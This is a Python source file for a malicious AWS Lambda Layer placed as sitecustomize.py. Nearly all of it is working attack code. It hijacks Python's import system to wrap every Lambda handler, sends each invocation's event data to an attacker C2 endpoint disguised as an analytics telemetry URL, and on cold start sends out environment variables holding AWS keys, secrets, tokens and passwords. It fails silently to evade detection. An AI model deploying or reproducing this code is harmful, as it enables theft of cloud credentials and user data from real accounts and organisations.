"""
Malicious Lambda Layer -- sitecustomize.py
===========================================
This file is automatically loaded by Python when the interpreter starts.
Lambda Layers extract to /opt/, and /opt/python/ is on the Python path.

When placed as /opt/python/sitecustomize.py in a Lambda Layer, this code
runs BEFORE the Lambda handler, intercepting every invocation.

ATTACK MECHANICS:
  1. Monkey-patches the Lambda runtime's handler loading mechanism
  2. Wraps every handler function with an interceptor
  3. Exfiltrates event data (API keys, PII, tokens) to attacker's endpoint
  4. Steals environment variables (AWS credentials, secrets)
  5. Returns the legitimate handler's response -- victim sees nothing wrong
"""

import json
import os
import urllib.request
import urllib.parse
import sys
import functools

# Attacker's C2 endpoint
C2_ENDPOINT = "https://telemetry-api.cloud-analytics.io/v2/collect"

def _exfiltrate(data_type, data):
    """Send stolen data to C2 server. Fail silently to avoid detection."""
    try:
        payload = json.dumps({
            "type": data_type,
            "function": os.environ.get("AWS_LAMBDA_FUNCTION_NAME", "unknown"),
            "region": os.environ.get("AWS_REGION", "unknown"),
            "account": os.environ.get("AWS_ACCOUNT_ID", "unknown"),
            "data": data
        }).encode()

        req = urllib.request.Request(
            C2_ENDPOINT,
            data=payload,
            headers={"Content-Type": "application/json"},
            method="POST"
        )
        urllib.request.urlopen(req, timeout=2)
    except Exception:
        pass  # Fail silently -- never raise exceptions that would alert


def _steal_environment():
    """Exfiltrate AWS credentials and secrets from environment variables."""
    sensitive_vars = {}
    for key, value in os.environ.items():
        if any(s in key.upper() for s in [
            "AWS_ACCESS_KEY", "AWS_SECRET", "AWS_SESSION_TOKEN",
            "API_KEY", "SECRET", "TOKEN", "PASSWORD", "DATABASE",
            "PRIVATE_KEY", "CREDENTIALS"
        ]):
            sensitive_vars[key] = value

    if sensitive_vars:
        _exfiltrate("credentials", sensitive_vars)


def _wrap_handler(original_handler):
    """Wrap a Lambda handler to intercept event data."""
    @functools.wraps(original_handler)
    def intercepted_handler(event, context):
        # Exfiltrate the event data (may contain API keys, PII, tokens)
        _exfiltrate("event", {
            "event": event,
            "request_id": getattr(context, "aws_request_id", "unknown"),
            "function_arn": getattr(context, "invoked_function_arn", "unknown")
        })

        # Call the original handler -- victim gets normal response
        return original_handler(event, context)

    return intercepted_handler


# === MONKEY-PATCH THE IMPORT SYSTEM ===
# Override __import__ to intercept handler module loading

_original_import = __builtins__.__import__ if hasattr(__builtins__, '__import__') else __import__
_handler_module = os.environ.get("_HANDLER", "handler.handler").split(".")[0]

def _patched_import(name, *args, **kwargs):
    """Intercept imports to wrap the Lambda handler function."""
    module = _original_import(name, *args, **kwargs)

    # Only patch the handler module
    if name == _handler_module:
        handler_func_name = os.environ.get("_HANDLER", "handler.handler").split(".")[-1]
        if hasattr(module, handler_func_name):
            original = getattr(module, handler_func_name)
            if not getattr(original, '_intercepted', False):
                wrapped = _wrap_handler(original)
                wrapped._intercepted = True
                setattr(module, handler_func_name, wrapped)

    return module

# Install the patched import
try:
    __builtins__.__import__ = _patched_import
except AttributeError:
    __builtins__["__import__"] = _patched_import

# Steal credentials on cold start (once per container)
_steal_environment()
